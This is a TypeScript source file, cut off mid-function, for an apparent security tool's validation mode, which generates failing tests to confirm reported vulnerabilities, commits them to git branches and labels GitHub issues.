/**
 * Validation Mode Implementation
 * RFC-041: Prove vulnerabilities exist with RED tests
 */

import { IssueContext, ActionConfig } from '../types/index.js';
import { logger } from '../utils/logger.js';
import { ValidationResult, TestExecutionResult, Vulnerability, TestFileContext, TestSuite, AttemptHistory, TestFramework } from './types.js';
import { vendorFilterUtils } from './vendor-utils.js';
import { TestGeneratingSecurityAnalyzer } from '../ai/test-generating-security-analyzer.js';
import { GitBasedTestValidator } from '../ai/git-based-test-validator.js';
import { analyzeIssue } from '../ai/analyzer.js';
import { AIConfig } from '../ai/types.js';
import { execSync } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import { getGitHubClient } from '../github/api.js';
import { PhaseDataClient } from './phase-data-client/index.js';
import { TestIntegrationClient } from './test-integration-client.js';

export class ValidationMode {
  private config: ActionConfig;
  private falsePositiveCache: Set<string>;
  private repoPath: string;
  private phaseDataClient: PhaseDataClient | null;
  private testIntegrationClient: TestIntegrationClient | null;

  constructor(config: ActionConfig, repoPath?: string) {
    this.config = config;
    this.repoPath = repoPath || process.cwd();
    this.falsePositiveCache = new Set();

    // Initialize PhaseDataClient if API key is available
    this.phaseDataClient = config.rsolvApiKey
      ? new PhaseDataClient(config.rsolvApiKey)
      : null;

    // Initialize TestIntegrationClient if API key is available
    this.testIntegrationClient = config.rsolvApiKey
      ? new TestIntegrationClient(config.rsolvApiKey)
      : null;

    // Apply environment variables from config
    if (config.environmentVariables && typeof config.environmentVariables === 'object') {
      Object.entries(config.environmentVariables).forEach(([key, value]) => {
        if (typeof value === 'string') {
          process.env[key] = value;
          logger.debug(`Applied environment variable: ${key}`);
        }
      });
    }

    this.loadFalsePositiveCache();
  }
  
  /**
   * Validate a single vulnerability
   */
  async validateVulnerability(issue: IssueContext): Promise<ValidationResult> {
    const isTestingMode = process.env.RSOLV_TESTING_MODE === 'true';
    const executableTestsEnabled = this.config.executableTests ?? true; // RFC-060 Phase 5.1: Default enabled

    logger.info(`[VALIDATION MODE] Starting validation for issue #${issue.number}`);
    if (isTestingMode) {
      logger.info(`[VALIDATION MODE] 🧪 TESTING MODE ENABLED - Will not filter based on test results`);
    }

    // RFC-060 Phase 5.1: Feature flag check - skip validation if disabled
    if (!executableTestsEnabled) {
      logger.info(`[VALIDATION MODE] Executable tests disabled - skipping validation`);
      return {
        issueId: issue.number,
        validated: true, // Mark as validated to allow mitigation phase to proceed
        timestamp: new Date().toISOString(),
        commitHash: this.getCurrentCommitHash()
      };
    }

    try {
      // Step 1: Ensure clean git state
      this.ensureCleanGitState();

      // Step 2: Check for vendor files FIRST (most token-efficient filter)
      const vendorFiles = await vendorFilterUtils.checkForVendorFiles(issue);
      if (vendorFiles.isVendor) {
        logger.info(`Issue #${issue.number} affects vendor files - marking as VENDORED`);
        return {
          issueId: issue.number,
          validated: false,
          vendoredFile: true,
          falsePositiveReason: 'Vulnerability in vendor file - requires library update',
          affectedVendorFiles: vendorFiles.files,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }

      // Step 3: Check false positive cache (second filter)
      const cacheKey = this.getCacheKey(issue);
      if (this.falsePositiveCache.has(cacheKey) && !process.env.RSOLV_SKIP_CACHE) {
        logger.info(`Issue #${issue.number} is in false positive cache, skipping`);
        return {
          issueId: issue.number,
          validated: false,
          falsePositiveReason: 'Previously identified as false positive',
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }

      // Step 4: Analyze the issue
      logger.info(`Analyzing issue #${issue.number} for validation`);
      const analysisData = await analyzeIssue(issue, this.config);

      if (!analysisData.canBeFixed) {
        logger.warn(`Issue #${issue.number} cannot be validated: ${analysisData.cannotFixReason}`);
        return {
          issueId: issue.number,
          validated: false,
          falsePositiveReason: analysisData.cannotFixReason || 'Analysis determined issue cannot be fixed',
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }
      
      // Step 5: Generate RED tests
      logger.info(`Generating RED tests for issue #${issue.number}`);
      const testResults = await this.generateRedTests(issue, analysisData);
      
      if (!testResults || !testResults.generatedTests) {
        logger.warn(`Failed to generate tests for issue #${issue.number}`);
        return {
          issueId: issue.number,
          validated: false,
          falsePositiveReason: 'Unable to generate validation tests',
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      }
      
      // Step 6: RFC-058 - Create validation branch and commit tests
      logger.info(`Creating validation branch for test persistence`);
      let branchName: string | null = null;
      const isTestingMode = process.env.RSOLV_TESTING_MODE === 'true';

      try {
        branchName = await this.createValidationBranch(issue);
        await this.commitTestsToBranch(testResults.generatedTests.testSuite, branchName, issue);
        logger.info(`✅ Tests committed to validation branch: ${branchName}`);
      } catch (error) {
        if (isTestingMode) {
          // In test mode, we MUST persist tests even if imperfect
          logger.warn(`Test mode: Force committing tests despite error: ${error}`);
          try {
            // Try to recover by using existing branch or creating with different approach
            branchName = `rsolv/validate/issue-${issue.number}`;
            await this.forceCommitTestsInTestMode(testResults.generatedTests.testSuite, branchName, issue);
            logger.info(`✅ Test mode: Tests force-committed to branch: ${branchName}`);
          } catch (forceError) {
            logger.error(`Test mode: Failed to force commit tests: ${forceError}`);
            // Even if commit fails, keep branch name for tracking
          }
        } else {
          logger.warn(`Could not create validation branch: ${error}`);
          // Continue with standard validation if branch creation fails in non-test mode
        }
      }

      // Step 7: Run tests to verify they fail (proving vulnerability exists)
      logger.info(`Running RED tests to prove vulnerability exists`);
      const validator = new GitBasedTestValidator();
      const validationResult = await validator.validateFixWithTests(
        'HEAD',
        'HEAD',
        testResults.generatedTests.testSuite
      );

      // Step 8: Determine validation status
      // RFC-060: In VALIDATE mode, we only check if RED tests FAIL on vulnerable code
      // We pass HEAD for both commits, so we only care about vulnerableCommit results
      // isTestingMode already declared above

      // RFC-060 Phase 2.2: Extract test execution metadata
      const testExecutionResult: TestExecutionResult = {
        passed: validationResult.vulnerableCommit.allPassed || false, // In VALIDATE mode, tests should FAIL (allPassed=false)
        output: JSON.stringify(validationResult, null, 2), // Store full validation result as output
        stderr: '',
        timedOut: false,
        exitCode: validationResult.vulnerableCommit.allPassed ? 0 : 1, // Exit code 1 means tests failed = vulnerability exists
        error: validationResult.error && validationResult.error !== 'Fix validation failed - tests do not confirm vulnerability was fixed'
          ? validationResult.error
          : undefined, // Ignore "fix validation failed" error in VALIDATE mode since we're not validating a fix
        framework: testResults.generatedTests.framework,
        testFile: testResults.generatedTests.testFile
      };

      // RFC-060: Check if RED tests failed on vulnerable code (proving vulnerability exists)
      // In VALIDATE mode with HEAD==HEAD, we only check vulnerableCommit results
      const testsFailedOnVulnerableCode = !validationResult.vulnerableCommit.allPassed;

      if (testsFailedOnVulnerableCode) {
        // RFC-060: Tests FAILED on vulnerable code = vulnerability EXISTS = validated!
        logger.info(`✅ Vulnerability validated! RED tests failed as expected`);

        // RFC-058: Store validation result with branch reference
        if (branchName) {
          await this.storeValidationResultWithBranch(issue, testResults, validationResult, branchName);
          logger.info(`Validation result stored with branch reference: ${branchName}`);
        } else {
          // Fallback to standard storage
          await this.storeValidationResult(issue, testResults, validationResult);
        }

        // RFC-060 Phase 2.2: Add validated label
        await this.addGitHubLabel(issue, 'rsolv:validated');

        // RFC-060 Phase 2.2 & 3.1: Store via PhaseDataClient
        await this.storeTestExecutionInPhaseData(issue, testExecutionResult, true, branchName || undefined);

        return {
          issueId: issue.number,
          validated: true,
          branchName: branchName || undefined,
          redTests: testResults.generatedTests.testSuite,
          testResults: validationResult,
          testExecutionResult,
          timestamp: new Date().toISOString(),
          commitHash: this.getCurrentCommitHash()
        };
      } else {
        // RFC-060: Tests PASSED on vulnerable code = no vulnerability = false positive (unless testing mode)
        if (isTestingMode) {
          logger.info(`[TESTING MODE] Tests passed but proceeding anyway for known vulnerable repo`);

          // RFC-058: Store validation result with branch reference even in test mode
          if (branchName) {
            await this.storeValidationResultWithBranch(issue, testResults, validationResult, branchName);
            logger.info(`Test mode validation result stored with branch reference: ${branchName}`);
          } else {
            // Fallback to standard storage
            await this.storeValidationResult(issue, testResults, validationResult);
          }

          // RFC-060 Phase 2.2 & 3.1: Store via PhaseDataClient
          await this.storeTestExecutionInPhaseData(issue, testExecutionResult, true, branchName || undefined);

          // In testing mode, still mark as validated to allow full workflow testing
          return {
            issueId: issue.number,
            validated: true,
            branchName: branchName || undefined,
            redTests: testResults.generatedTests.testSuite,
            testResults: validationResult,
            testExecutionResult,
            testingMode: true,
            testingModeNote: 'Tests passed but proceeding due to RSOLV_TESTING_MODE',
            timestamp: new Date().toISOString(),
            commitHash: this.getCurrentCommitHash()
          };
        } else {
          logger.info(`Tests passed on vulnerable code - marking as false positive`);
          this.addToFalsePositiveCache(issue);

          // RFC-060 Phase 2.2: Add false-positive label
          await this.addGitHubLabel(issue, 'rsolv:false-positive');

          // RFC-060 Phase 2.2 & 3.1: Store via PhaseDataClient
          await this.storeTestExecutionInPhaseData(issue, testExecutionResult, false, branchName || undefined);

          return {
            issueId: issue.number,
            validated: false,
            falsePositiveReason: 'Tests passed on allegedly vulnerable code',
            testResults: validationResult,
            testExecutionResult,
            timestamp: new Date().toISOString(),
            commitHash: this.getCurrentCommitHash()
          };
        }
      }
      
    } catch (error) {
      logger.error(`Validation failed for issue #${issue.number}:`, error);
      return {
        issueId: issue.number,
        validated: false,
        falsePositiveReason: `Validation error: ${error}`,
        timestamp: new Date().toISOString(),
        commitHash: this.getCurrentCommitHash()
      };
    }
  }

  /**
   * Validate multiple vulnerabilities in batch
   */
  async validateBatch(issues: IssueContext[]): Promise<ValidationResult[]> {
    logger.info(`[VALIDATION MODE] Validating batch of ${issues.length} issues`);
    const results: ValidationResult[] = [];
    
    for (const issue of issues) {
      const result = await this.validateVulnerability(issue);
      results.push(result);
      
      // Add delay between validations to avoid rate limits
      if (issues.indexOf(issue) < issues.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }
    
    // Summary
    const validated = results.filter(r => r.validated).length;
    const falsePositives = results.filter(r => !r.validated).length;
    
    logger.info(`[VALIDATION MODE] Batch complete:`);
    logger.info(`  - Validated: ${validated}`);
    logger.info(`  - False positives: ${falsePositives}`);
    
    return results;
  }
  
  /**
   * Generate RED tests for vulnerability validation
   */
  private async generateRedTests(issue: IssueContext, analysisData: any): Promise<any> {
    const aiConfig: AIConfig = {
      provider: 'anthropic',
      apiKey: this.config.aiProvider.apiKey,
      model: this.config.aiProvider.model,
      temperature: 0.2,
      maxTokens: this.config.aiProvider.maxTokens,
      useVendedCredentials: this.config.aiProvider.useVendedCredentials
    };
    
    const testAnalyzer = new TestGeneratingSecurityAnalyzer(aiConfig);
    
    // Get codebase files for test generation
    const codebaseFiles = new Map<string, string>();
    
    if (analysisData.filesToModify && analysisData.filesToModify.length > 0) {
      for (const filePath of analysisData.filesToModify) {
        try {
          const fullPath = path.resolve(this.repoPath, filePath);
          if (fs.existsSync(fullPath)) {
            const content = fs.readFileSync(fullPath, 'utf8');
            codebaseFiles.set(filePath, content);
            logger.debug(`Added file for test generation: ${filePath}`);
          }
        } catch (error) {
          logger.warn(`Could not read file ${filePath}:`, error);
        }
      }
    }
    
    // Generate tests focused on proving vulnerability exists
    return await testAnalyzer.analyzeWithTestGeneration(
      issue,
      this.config,
      codebaseFiles
    );
  }
  

  /**
   * RFC-058: Create validation branch for test persistence
   */
  async createValidationBranch(issue: IssueContext): Promise<string> {
    const branchName = `rsolv/validate/issue-${issue.number}`;

    try {
      // Create and checkout branch
      execSync(`git checkout -b ${branchName}`, { cwd: this.repoPath });
      logger.info(`Created validation branch: ${branchName}`);

      return branchName;
    } catch (error) {
      logger.error(`Failed to create validation branch ${branchName}:`, error);
      throw error;
    }
  }

  /**
   * Force commit tests in test mode - ensures tests are always persisted
   * even when normal commit process fails
   */
  async forceCommitTestsInTestMode(
    testContent: any,
    branchName: string,
    issue: IssueContext
  ): Promise<void> {
    const testDir = path.join(this.repoPath, '.rsolv', 'tests');

    try {
      // Ensure directory exists
      fs.mkdirSync(testDir, { recursive: true });

      // Serialize test content
      const testString = typeof testContent === 'string'
        ? testContent
        : JSON.stringify(testContent, null, 2);

      // Write test file
      const testPath = path.join(testDir, 'validation.test.js');
      fs.writeFileSync(testPath, testString, 'utf8');

      // Try to ensure we're on the right branch
      try {
        execSync(`git checkout ${branchName} 2>/dev/null || git checkout -b ${branchName}`, {
          cwd: this.repoPath,
          stdio: 'pipe'
        });
      } catch {
        // Branch operations failed, but continue with commit attempt
        logger.debug(`Branch checkout failed, continuing with current branch`);
      }

      // Configure git identity
      try {
        execSync('git config user.email "rsolv-validation@rsolv.dev"', {
          cwd: this.repoPath,
          stdio: 'pipe'
        });
        execSync('git config user.name "RSOLV Validation Bot"', {
          cwd: this.repoPath,
          stdio: 'pipe'
        });
      } catch {
        // Git config might already be set
      }

      // Stage and commit
      execSync('git add .rsolv/tests/', { cwd: this.repoPath });
      execSync(`git commit -m "Test mode: Add validation tests for issue #${issue.number}" || true`, {
        cwd: this.repoPath,
        stdio: 'pipe'
      });

      // Try to push but don't fail if it doesn't work
      try {
        const token = process.env.GITHUB_TOKEN || process.env.GH_PAT;
        if (token && process.env.GITHUB_REPOSITORY) {
          const [owner, repo] = process.env.GITHUB_REPOSITORY.split('/');
          const authenticatedUrl = `https://x-access-token:${token}@github.com/${owner}/${repo}.git`;
          execSync(`git remote set-url origin ${authenticatedUrl} 2>/dev/null || true`, {
            cwd: this.repoPath,
            stdio: 'pipe'
          });
        }
        execSync(`git push -f origin ${branchName} 2>/dev/null || true`, {
          cwd: this.repoPath,
          stdio: 'pipe'
        });
      } catch {
        logger.debug(`Push failed in test mode, but tests are committed locally`);
      }
    } catch (error) {
      logger.error(`Force commit in test mode failed: ${error}`);
      throw error;
    }
  }

  /**
   * RFC-058 + RFC-060-AMENDMENT-001 Phase 2: Commit generated tests to validation branch
   * Uses retry with exponential backoff for backend integration
   *
   * Philosophy: If backend is down, we can't fully service the customer anyway.
   * Better to fail fast and maintain clear state than silently degrade.
   */
  async commitTestsToBranch(testContent: any, branchName: string, issue?: IssueContext): Promise<void> {
    try {
      let targetFile: string;
      let integratedContent: string;

      // Phase 3: Backend integration with retry
      // For now, backend doesn't exist yet, so we use temporary fallback
      if (this.config.rsolvApiKey && process.env.RSOLV_API_URL) {
        try {
          const result = await this.integrateTestsWithBackendRetry(testContent, issue);
          targetFile = result.targetFile;
          integratedContent = result.content;
          logger.info(`✅ Backend integration succeeded: ${targetFile}`);
        } catch (backendError) {
          logger.error(`Backend integration failed after retries: ${backendError}`);
          throw new Error(`Cannot commit tests: backend unavailable. ${backendError}`);
        }
      } else {
        // Temporary: Backend not configured yet (Phase 2)
        // Use .rsolv/tests/ until backend is ready in Phase 3
        logger.info('Backend not configured (Phase 3 pending), using .rsolv/tests/');
        const testDir = path.join(this.repoPath, '.rsolv', 'tests');
        fs.mkdirSync(testDir, { recursive: true });

        // Serialize test content
        if (typeof testContent === 'string') {
          integratedContent = testContent;
        } else if (testContent && typeof testContent === 'object') {
          integratedContent = JSON.stringify(testContent, null, 2);
        } else {
          integratedContent = `// Validation test\ndescribe('Vulnerability Test', () => {\n  it('validates vulnerability', () => {\n    // ${testContent}\n  });\n});\n`;
        }

        targetFile = path.join(testDir, 'validation.test.js');
        fs.writeFileSync(targetFile, integratedContent, 'utf8');
      }

      // Configure git identity for commits
      execSync('git config user.email "rsolv-validation@rsolv.dev"', { cwd: this.repoPath });
      execSync('git config user.name "RSOLV Validation Bot"', { cwd: this.repoPath });

      // Commit to branch
      const commitPath = path.dirname(targetFile);
      execSync(`git add ${commitPath}`, { cwd: this.repoPath });
      execSync(`git commit -m "Add validation tests for issue"`, { cwd: this.repoPath });

      logger.info(`Committed tests to branch ${branchName} (target: ${targetFile})`);

      // RFC-058: Push validation branch to remote for mitigation phase
      try {
        const token = process.env.GITHUB_TOKEN || process.env.GH_PAT;
        if (token && process.env.GITHUB_REPOSITORY) {
          const [owner, repo] = process.env.GITHUB_REPOSITORY.split('/');
          const authenticatedUrl = `https://x-access-token:${token}@github.com/${owner}/${repo}.git`;
          try {
            execSync(`git remote set-url origin ${authenticatedUrl}`, { cwd: this.repoPath });
          } catch (configError) {
            logger.debug('Could not configure authenticated remote');
          }
        }

        execSync(`git push -f origin ${branchName}`, { cwd: this.repoPath });
        logger.info(`Pushed validation branch ${branchName} to remote`);
      } catch (pushError) {
        logger.warn(`Could not push validation branch to remote: ${pushError}`);
        // Continue anyway - branch exists locally for immediate use
      }
    } catch (error) {
      logger.error(`Failed to commit tests to branch ${branchName}:`, error);
      throw error;
    }
  }

  /**
   * RFC-060-AMENDMENT-001 Phase 2: Integrate tests with backend using retry logic
   * Retries with exponential backoff: 1s, 2s, 4s
   */
  private async integrateTestsWithBackendRetry(
    testContent: any,
    issue?: IssueContext
  ): Promise<{ targetFile: string; content: string }> {
    const maxAttempts = 3;
    const baseDelay = 1000; // 1 second

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        logger.debug(`Backend integration attempt ${attempt}/${maxAttempts}...`);

        // TODO Phase 3: Implement TestIntegrationClient
        // const client = new TestIntegrationClient(this.config.rsolvApiKey);
        //
        // // Step 1: Analyze test files to find best target
        // const analysis = await client.analyze({
        //   vulnerableFile: issue?.file || 'unknown',
        //   vulnerabilityType: issue?.title || 'unknown',
        //   candidateTestFiles: await this.scanForTestFiles(),
        //   framework: await this.detectFrameworkType()
        // });
        //
        // // Step 2: Generate AST-integrated test
        // const generated = await client.generate({
        //   targetFileContent: fs.readFileSync(analysis.recommendations[0].path, 'utf8'),
        //   testSuite: this.formatTestSuite(testContent, issue),
        //   framework: analysis.framework,
        //   language: this.detectLanguage(analysis.recommendations[0].path)
        // });
        //
        // // Step 3: Return integrated result
        // return {
        //   targetFile: analysis.recommendations[0].path,
        //   content: generated.integratedContent
        // };

        // Placeholder: Backend not implemented yet
        throw new Error('Backend not implemented (Phase 3)');

      } catch (error) {
        const isLastAttempt = attempt === maxAttempts;

        if (isLastAttempt) {
          logger.error(`Backend integration failed after ${maxAttempts} attempts`);
          throw error;
        }

        // Check if error is retryable
        const isRetryable = this.isRetryableError(error);
        if (!isRetryable) {
          logger.error(`Non-retryable error: ${error}`);
          throw error;
        }

        // Exponential backoff: 1s, 2s, 4s
        const delay = baseDelay * Math.pow(2, attempt - 1);
        logger.warn(`Attempt ${attempt} failed (${error}), retrying in ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }

  /**
   * Determine if error is retryable (transient vs permanent)
   */
  private isRetryableError(error: any): boolean {
    const errorMessage = String(error).toLowerCase();

    // Retryable: Network issues, timeouts, 5xx errors
    const retryablePatterns = [
      'timeout',
      'econnrefused',
      'enotfound',
      'network',
      '503', // Service Unavailable
      '502', // Bad Gateway
      '504', // Gateway Timeout
      '429'  // Too Many Requests (rate limit)
    ];

    // Non-retryable: 4xx client errors (except 429)
    const nonRetryablePatterns = [
      '400', // Bad Request
      '401', // Unauthorized
      '403', // Forbidden
      '404', // Not Found
      '422'  // Unprocessable Entity
    ];

    // Check non-retryable first (more specific)
    if (nonRetryablePatterns.some(pattern => errorMessage.includes(pattern))) {
      return false;
    }

    // Check retryable patterns
    if (retryablePatterns.some(pattern => errorMessage.includes(pattern))) {
      return true;
    }

    // Default: retry on unknown errors (safer)
    return true;
  }


  /**
   * RFC-058: Store validation result with branch reference
   */
  async storeValidationResultWithBranch(
    issue: IssueContext,
    testResults: any,
    validationResult: any,
    branchName: string
  ): Promise<void> {
    const storageDir = path.join(this.repoPath, '.rsolv', 'validation');
    fs.mkdirSync(storageDir, { recursive: true });

    const filePath = path.join(storageDir, `issue-${issue.number}.json`);
    const data = {
      issueId: issue.number,
      issueTitle: issue.title,
      branchName: branchName,  // NEW: Store branch reference
      validated: true,
      testResults: testResults,
      validationResult: validationResult,
      timestamp: new Date().toISOString(),
      commitHash: this.getCurrentCommitHash()
    };

    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    logger.info(`Validation result with branch stored at ${filePath}`);
  }

  /**
   * Store validation result for mitigation phase
   */
  private async storeValidationResult(
    issue: IssueContext,
    testResults: any,
    validationResult: any
  ): Promise<void> {
    const storageDir = path.join(this.repoPath, '.rsolv', 'validation');
    fs.mkdirSync(storageDir, { recursive: true });

    const filePath = path.join(storageDir, `issue-${issue.number}.json`);
    const data = {
      issueId: issue.number,
      issueTitle: issue.title,
      validated: true,
      testResults: testResults,
      validationResult: validationResult,
      timestamp: new Date().toISOString(),
      commitHash: this.getCurrentCommitHash()
    };

    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    logger.info(`Validation result stored at ${filePath}`);
  }
  
  /**
   * Load false positive cache
   */
  private loadFalsePositiveCache(): void {
    try {
      const cachePath = path.join(this.repoPath, '.rsolv', 'false-positives.json');
      if (fs.existsSync(cachePath)) {
        const data = JSON.parse(fs.readFileSync(cachePath, 'utf8'));
        data.entries?.forEach((entry: any) => {
          // Skip expired entries
          if (entry.expiresAt && new Date(entry.expiresAt) < new Date()) {
            return;
          }
          this.falsePositiveCache.add(entry.pattern);
        });
        logger.info(`Loaded ${this.falsePositiveCache.size} false positive patterns`);
      }
    } catch (error) {
      logger.warn('Could not load false positive cache:', error);
    }
  }
  
  /**
   * Add issue to false positive cache
   */
  private addToFalsePositiveCache(issue: IssueContext): void {
    const cacheKey = this.getCacheKey(issue);
    this.falsePositiveCache.add(cacheKey);
    
    // Persist to disk
    const cachePath = path.join(this.repoPath, '.rsolv', 'false-positives.json');
    const cacheDir = path.dirname(cachePath);
    fs.mkdirSync(cacheDir, { recursive: true });
    
    const entries = Array.from(this.falsePositiveCache).map(pattern => ({
      pattern,
      timestamp: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString() // 30 days
    }));
    
    fs.writeFileSync(cachePath, JSON.stringify({ entries, version: '1.0' }, null, 2));
    logger.info(`Added issue #${issue.number} to false positive cache`);
  }
  
  /**
   * Get cache key for issue
   */
  private getCacheKey(issue: IssueContext): string {
    // Create a unique key based on issue characteristics
    return `${issue.repository}#${issue.number}#${issue.title}`;
  }
  
  /**
   * Ensure git repository is in clean state
   */
  private ensureCleanGitState(): void {
    try {
      const status = execSync('git status --porcelain', { encoding: 'utf8' });
      if (status.trim()) {
        throw new Error('Repository has uncommitted changes');
      }
    } catch (error) {
      logger.warn('Git state check failed:', error);
    }
  }
  

  /**
   * Get current git commit hash
   */
  private getCurrentCommitHash(): string {
    try {
      return execSync('git rev-parse HEAD', { encoding: 'utf8' }).trim();
    } catch {
      return 'unknown';
    }
  }

  /**
   * RFC-060 Phase 2.2: Add GitHub label to issue
   */
  private async addGitHubLabel(issue: IssueContext, label: string): Promise<void> {
    try {
      const githubClient = getGitHubClient(this.config);
      await githubClient.issues.addLabels({
        owner: issue.repository.owner,
        repo: issue.repository.name,
        issue_number: issue.number,
        labels: [label]
      });
      logger.info(`Added label '${label}' to issue #${issue.number}`);
    } catch (error) {
      logger.warn(`Failed to add label '${label}' to issue #${issue.number}:`, error);
    }
  }

  /**
   * RFC-060 Phase 2.2 & 3.1: Store test execution results in PhaseDataClient
   */
  private async storeTestExecutionInPhaseData(
    issue: IssueContext,
    testExecution: TestExecutionResult,
    validated: boolean,
    branchName?: string
  ): Promise<void> {
    if (!this.phaseDataClient) {
      logger.debug('PhaseDataClient not available, skipping phase data storage');
      return;
    }

    try {
      await this.phaseDataClient.storePhaseResults(
        'validate',
        {
          validate: {
            [issue.number]: {
              validated,
              branchName,
              testPath: testExecution.testFile,
              testExecutionResult: testExecution,
              timestamp: new Date().toISOString()
            }
          }
        },
        {
          repo: issue.repository.fullName,
          issueNumber: issue.number,
          commitSha: this.getCurrentCommitHash()
        }
      );
      logger.info(`Stored test execution results in PhaseDataClient for issue #${issue.number}`);
    } catch (error) {
      logger.warn(`Failed to store test execution in PhaseDataClient:`, error);
    }
  }

  /**
   * RFC-060-AMENDMENT-001: Generate test with retry loop
   * Implements LLM-based test generation with error feedback and retry logic
   */
  async generateTestWithRetry(
    vulnerability: Vulnerability,
    targetTestFile: TestFileContext,
    maxAttempts: number = 3
  ): Promise<TestSuite | null> {
    const previousAttempts: AttemptHistory[] = [];
    const framework = this.detectFrameworkFromPath(targetTestFile.path);

    logger.info(`Starting test generation with retry (max ${maxAttempts} attempts)`);
    logger.info(`Vulnerability: ${vulnerability.type} at ${vulnerability.location}`);
    logger.info(`Target test file: ${targetTestFile.path}`);

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      logger.info(`Attempt ${attempt}/${maxAttempts}: Generating test...`);

      try {
        // 1. Generate test with LLM (pass target file content + previous errors)
        const testSuite = await this.generateTestWithLLM(
          vulnerability,
          targetTestFile,
          previousAttempts,
          framework
        );

        // 2. Write to temp file
        const tempDir = path.join(this.repoPath, '.rsolv', 'temp');
        fs.mkdirSync(tempDir, { recursive: true });

        const ext = this.getLanguageExtension(framework.name);
        const tempFile = path.join(tempDir, `test_${Date.now()}${ext}`);
        fs.writeFileSync(tempFile, testSuite.redTests[0].testCode, 'utf8');

        logger.info(`Wrote test to temp file: ${tempFile}`);

        // 3. Validate syntax
        try {
          await this.validateSyntax(tempFile, framework);
          logger.info(`✓ Syntax validation passed`);
        } catch (syntaxError) {
          logger.warn(`✗ Syntax error on attempt ${attempt}:`, syntaxError);
          previousAttempts.push({
            attempt,
            error: 'SyntaxError',
            errorMessage: syntaxError instanceof Error ? syntaxError.message : String(syntaxError),
            timestamp: new Date().toISOString()
          });
          continue; // Retry with error context
        }

        // 4. Run test (must FAIL on vulnerable code)
        try {
          const testResult = await this.runTest(tempFile, framework);

          if (testResult.passed) {
            logger.warn(`✗ Test passed unexpectedly on attempt ${attempt} (should fail on vulnerable code)`);
            previousAttempts.push({
              attempt,
              error: 'TestPassedUnexpectedly',
              errorMessage: 'Test passed when it should fail to demonstrate vulnerability',
              timestamp: new Date().toISOString()
            });
            continue; // Retry with "make it fail" feedback
          }

          // 5. Check for regressions (existing tests should still pass)
          if (testResult.existingTestsFailed) {
            logger.warn(`✗ Existing tests failed on attempt ${attempt} (regression detected)`);
            previousAttempts.push({
              attempt,
              error: 'ExistingTestsRegression',
              errorMessage: `Existing tests failed: ${testResult.failedTests?.join(', ')}`,
              timestamp: new Date().toISOString()
            });
            continue; // Retry with regression context
          }

          // Success! Test is valid
          logger.info(`✓ Test generation successful on attempt ${attempt}`);
          return testSuite;

        } catch (testError) {
          logger.error(`Error running test on attempt ${attempt}:`, testError);
          previousAttempts.push({
            attempt,
            error: 'TestExecutionError',
            errorMessage: testError instanceof Error ? testError.message : String(testError),
            timestamp: new Date().toISOString()
          });
          continue;
        }

      } catch (error) {
        logger.error(`Error during test generation attempt ${attempt}:`, error);
        previousAttempts.push({
          attempt,
          error: 'GenerationError',
          errorMessage: error instanceof Error ? error.message : String(error),
          timestamp: new Date().toISOString()
        });
      }
    }

    // All retries exhausted - tag issue and return null
    logger.warn(`Failed to generate valid test after ${maxAttempts} attempts`);
    await this.tagIssueNotValidated(vulnerability, previousAttempts);
    return null;
  }

  /**
   * Generate test using LLM with vulnerability context and retry feedback
   */
  private async generateTestWithLLM(
    vulnerability: Vulnerability,
    targetTestFile: TestFileContext,
    previousAttempts: AttemptHistory[],
    framework: TestFramework
  ): Promise<TestSuite> {
    // Build LLM prompt with realistic vulnerability examples
    const prompt = this.buildLLMPrompt(vulnerability, targetTestFile, previousAttempts, framework);

    // Use existing TestGeneratingSecurityAnalyzer for LLM interaction
    const aiConfig: AIConfig = {
      provider: 'anthropic',
      apiKey: this.config.aiProvider.apiKey,
      model: this.config.aiProvider.model,
      temperature: 0.2,
      maxTokens: this.config.aiProvider.maxTokens,
      useVendedCredentials: this.config.aiProvider.useVendedCredentials
    };

    const testAnalyzer = new TestGeneratingSecurityAnalyzer(aiConfig);

    // Create a mock issue context for the analyzer
    const mockIssue: IssueContext = {
      id: `vuln-${Date.now()}`,
      number: 0,
      title: vulnerability.description,
      body: prompt,
      labels: [],
      assignees: [],
      repository: {
        owner: 'test',
        name: 'test',
        fullName: 'test/test',
        defaultBranch: 'main'
      },
      source: 'github',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      metadata: {}
    };

    const codebaseFiles = new Map<string, string>();
    codebaseFiles.set(targetTestFile.path, targetTestFile.content);

    const result = await testAnalyzer.analyzeWithTestGeneration(
      mockIssue,
      this.config,
      codebaseFiles
    );

    if (!result.generatedTests?.testSuite) {
      throw new Error('LLM failed to generate test suite');
    }

    // Convert to our TestSuite format
    return {
      framework: framework.name,
      testFile: targetTestFile.path,
      redTests: result.generatedTests.testSuite.redTests || [result.generatedTests.testSuite.red]
    };
  }

  /**
   * Build LLM prompt with vulnerability context and retry feedback
   */
  private buildLLMPrompt(
    vulnerability: Vulnerability,
    targetTestFile: TestFileContext,
    previousAttempts: AttemptHistory[],
    framework: TestFramework
  ): string {
    const realisticExamples = this.getRealisticVulnerabilityExample(vulnerability.type);

    let prompt = `Generate a RED test for a security vulnerability.

VULNERABILITY: ${vulnerability.description}
TYPE: ${vulnerability.type}
LOCATION: ${vulnerability.location}
ATTACK VECTOR: ${vulnerability.attackVector}
${vulnerability.vulnerablePattern ? `VULNERABLE PATTERN: ${vulnerability.vulnerablePattern}` : ''}
${vulnerability.source ? `SOURCE: ${vulnerability.source}` : ''}

${realisticExamples}

TARGET TEST FILE: ${targetTestFile.path}
FRAMEWORK: ${framework.name}

TARGET FILE CONTENT (for context):
\`\`\`
${targetTestFile.content}
\`\`\`

YOUR TASK:
Generate test code that:
1. Uses the attack vector: ${vulnerability.attackVector}
2. FAILS on vulnerable code (proves exploit works)
3. PASSES after fix is applied
4. Reuses existing setup blocks from target file
